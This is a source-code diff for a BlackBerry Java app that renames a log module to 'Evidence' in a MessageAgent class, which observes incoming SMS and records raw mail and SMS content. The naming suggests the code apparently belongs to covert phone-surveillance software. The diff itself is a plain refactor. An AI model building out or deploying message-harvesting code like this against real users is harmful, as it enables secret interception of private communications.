@@ -29,10 +29,10 @@ import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
+import blackberry.evidence.TimestampMarkup;
 import blackberry.interfaces.SmsObserver;
-import blackberry.log.Log;
-import blackberry.log.LogType;
-import blackberry.log.TimestampMarkup;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -102,7 +102,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
                 "MessageAgent");
 
         //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
+        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.MAIL_RAW,
                 "Wrong Conversion");
         //#endif
 
@@ -216,22 +216,22 @@ public final class MessageAgent extends Agent implements SmsObserver {
      *            the content
      * @param logType
      */
-    public void createLog(final byte[] additionalData, final byte[] content,
+    public void createEvidence(final byte[] additionalData, final byte[] content,
             final int logType) {
 
         //#ifdef DBC
-        Check.requires(content != null, "createLog content null");
-        Check.requires(log != null, "log null");
+        Check.requires(content != null, "createEvidence content null");
+        Check.requires(evidence != null, "log null");
         //#endif
 
-        synchronized (log) {
-            log.createLog(additionalData, logType);
-            log.writeLog(content);
-            log.close();
+        synchronized (evidence) {
+            evidence.createEvidence(additionalData, logType);
+            evidence.writeEvidence(content);
+            evidence.close();
         }
 
         //#ifdef DEBUG
-        debug.trace("log created");
+        debug.trace("Evidence created");
         //#endif
     }
 
@@ -512,7 +512,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
 
             // Creating log
             if (dataMsg != null) {
-                createLog(additionalData, dataMsg, LogType.SMS_NEW);
+                createEvidence(additionalData, dataMsg, EvidenceType.SMS_NEW);
                 return;
             } else {
                 //#ifdef DEBUG
